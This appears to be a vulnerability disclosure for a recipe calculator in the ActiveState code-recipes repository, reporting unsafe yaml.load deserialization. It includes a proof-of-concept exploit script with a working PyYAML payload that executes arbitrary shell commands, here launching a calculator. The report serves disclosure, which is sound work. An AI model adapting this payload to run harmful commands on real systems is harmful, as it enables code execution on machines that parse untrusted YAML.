# Description
Welcome to the ActiveState Code recipes repo! We have migrated all of the great content from code.activestate.com to its new forever-home here at GitHub. This makes it easier for everyone to submit new recipes, contribute code and integrate all the great information into their own projects.
* **Vulnerability discription**
unsafe loading of data by the yaml.load function leading to Arbitrary code execution.
# Proof of Concept
* Vulnerable code part 
```python
def main(yml_food, yml_recipe):
    food = yaml.load(open(yml_food).read())
    recipe = yaml.load(open(yml_recipe).read())
    #https://github.com/ActiveState/code/blob/master/recipes/Python/93379_Recipe_Calculator/pyfood.py#L18
    #https://github.com/ActiveState/code/blob/master/recipes/Python/93379_Recipe_Calculator/pyfood.py#L17
```
1. run exploit.py
```python
# exploit.py
# this exploit is for simple recipe calculator in ActiveState/code repository
import os
os.system('git clone https://github.com/ActiveState/code.git')
os.chdir('code/recipes/Python/93379_Recipe_Calculator/')
exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
os.system('rm exp.yml')
open('exp.yml','w+').write(exploit)
os.system('python pyfood.py --yml-food=exp.yml --yml-recipe=exp.yml')
os.system('rm exp.yml')
```

![]()
